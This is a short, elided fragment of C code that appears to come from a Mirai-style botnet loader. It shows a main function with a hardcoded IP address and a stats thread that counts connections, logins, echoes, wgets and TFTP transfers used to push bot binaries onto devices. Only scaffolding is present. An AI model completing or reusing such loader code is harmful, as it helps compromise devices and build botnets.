...
int main(int argc, char **args)
{
    ...
    addrs[0] = inet_addr("206.189.237.42");
...
static void *stats_thread(void *arg)
{
    ...
    {
        #ifndef DEBUG
		printf("\e[37m(\e[91m%d\e[37ms)|Conns(\e[93m%d\e[37m)|Logins(\e[94m%d\e[37m)|yeetersran(\e[92m%d\e[37m)|Echoes(\e[95m%d\e[37m)|Wgets(\e[96m%d\e[37m)|TFTPs(\e[97m%d\e[37m)\n",
